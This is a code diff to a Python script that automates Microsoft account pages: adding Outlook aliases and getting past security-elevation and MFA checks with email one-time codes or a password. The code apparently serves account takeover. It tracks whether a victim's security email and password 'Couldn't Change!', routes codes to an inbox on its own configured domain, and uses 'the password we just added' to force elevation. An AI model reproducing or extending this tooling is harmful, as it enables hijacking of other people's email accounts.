@@ -389,7 +389,14 @@ async def _add_outlook_alias(
             or "acr_values" in loc
             or "mfa" in loc
         )
-        and security_email
+        and (
+            (security_email and security_email not in ("Couldn't Change!", "Unknown"))
+            or (
+                password
+                and str(password).strip()
+                not in ("", "Couldn't Change!", "Unknown", "?")
+            )
+        )
     ):
         print("[~] - AddAssocId redirected to MFA — elevating then retrying…")
         followed = await session.get(
@@ -808,13 +815,29 @@ async def _elevate_for_names_manage(
         # Re-hit manage after form chasing
         return await _get_manage(session)
 
-    if not security_email or security_email in ("Couldn't Change!", "Unknown"):
-        print("[X] - names/manage blocked by SA elevation and no security email")
+    pwd = (password or "").strip()
+    pwd_ok = bool(pwd) and pwd not in ("Couldn't Change!", "Unknown", "?")
+    inbox = (security_email or "").strip().lower()
+    inbox_ok = bool(inbox) and inbox not in ("couldn't change!", "unknown") and "@" in inbox
+    if not pwd_ok and not inbox_ok:
+        print("[X] - names/manage blocked by SA elevation and no security email/password")
         return text, None, _emails_from_manage(text)
 
+    # Our own inbox → OTP first. Passwordless Gmail proofs we cannot read →
+    # use the password we just added, otherwise GetOneTimeCode hangs 2 min.
+    can_otp = inbox_ok
+    if can_otp:
+        try:
+            import json as _json
+
+            cfg = _json.load(open("config/config.json", "r"))
+            our_domain = str(cfg.get("domain") or "").lower().strip()
+            if our_domain and not inbox.endswith(f"@{our_domain}"):
+                can_otp = False
+        except Exception:
+            pass
+    try_password_first = pwd_ok and not can_otp
     print("[~] - names/manage requires SA elevation — completing security-email MFA…")
-    # Do NOT password-first: posting login_pwd on i5600 burns sFT and
-    # GetOneTimeCode then returns State 203. Send security-email OTP first.
     resp = await _complete_i5600_email_otc(
         session,
         text,
@@ -823,7 +846,7 @@ async def _elevate_for_names_manage(
         password=password,
         wait_slices=(40.0, 50.0),
         label="Names MFA",
-        try_password_first=False,
+        try_password_first=try_password_first,
     )
     if resp is None:
         print("[X] - Failed to elevate session for names/manage")
